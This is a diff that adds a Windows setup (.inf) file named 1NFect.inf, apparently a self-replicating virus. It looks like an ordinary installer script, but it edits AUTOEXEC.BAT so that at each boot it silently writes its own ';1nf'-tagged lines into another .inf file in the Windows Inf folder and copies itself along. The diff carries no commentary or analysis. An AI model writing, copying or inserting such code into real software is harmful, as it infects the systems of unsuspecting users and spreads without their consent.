@@ -1,0 +1,33 @@
+[version]							;1nf
+signature="$CHICAGO$"						;1nf
+SetupClass=BASE							;1nf
+								;1nf
+[DefaultInstall]						;1nf
+CopyFiles = Host.File						;1nf
+UpdateAutoBat = Attach.It					;1nf
+								;1nf
+[Attach.it]							;1nf
+CmdDelete = "@ctty", "nul"					;1nf
+CmdDelete = "cd", "\Windows\Inf"				;1nf
+CmdDelete = "for", "%%%f in (*.inf) do set A=%%%f"		;1nf
+CmdDelete = "find", """1nf"" \vxer.txt > %A%"			;1nf
+CmdDelete = "echo", "vxer.txt, %A% >> %A%"			;1nf
+CmdDelete = "ctty", "con"					;1nf
+								;1nf
+CmdAdd = "@ctty", "nul"						;1nf
+CmdAdd = "cd", "\Windows\Inf"					;1nf
+CmdAdd = "for", "%%%f in (*.inf) do set A=%%%f"			;1nf
+CmdAdd = "find", """1nf"" \vxer.txt > %A%"			;1nf
+CmdAdd = "echo", "vxer.txt, %A% >> %A%"				;1nf
+CmdAdd = "ctty", "con"						;1nf
+								;1nf
+[DestinationDirs]						;1nf
+DefaultDestDir = 30						;1nf
+								;1nf
+[SourceDisksNames]						;1nf
+1="1nternal","",1						;1nf
+								;1nf
+[Host.File]							;1nf
+vxer.txt, 1NFect.inf
+
+
